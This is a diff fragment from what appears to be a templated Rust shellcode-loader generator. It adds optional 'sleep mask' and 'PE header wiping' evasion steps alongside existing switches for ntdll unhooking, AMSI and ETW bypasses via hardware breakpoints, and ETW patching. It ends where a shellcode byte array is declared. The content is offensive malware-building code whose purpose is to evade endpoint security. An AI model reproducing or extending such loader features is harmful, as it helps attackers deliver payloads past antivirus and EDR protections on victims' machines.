@@ -18,12 +18,18 @@ fn {{ v.fn_run }}() {
         {%- if "UnhookKnownDlls" in feature_names %}
         scaffold::evasion::unhook::unhook_ntdll_knowndlls();
         {%- endif %}
+        {%- if "SleepEncrypt" in feature_names %}
+        scaffold::evasion::sleep_mask::masked_sleep_jitter(2000);
+        {%- endif %}
         {%- if "AmsiHwbp" in feature_names %}
         scaffold::bypass::amsi_hwbp::install_amsi_bypass();
         {%- endif %}
         {%- if "EtwHwbp" in feature_names %}
         scaffold::bypass::etw_hwbp::install_etw_bypass();
         scaffold::bypass::etw_hwbp::patch_etw_full();
+        {%- endif %}
+        {%- if "PeCloak" in feature_names %}
+        scaffold::evasion::pe_cloak::wipe_pe_headers();
         {%- endif %}
 
         let {{ v.var_shellcode }}: &[u8] = &[
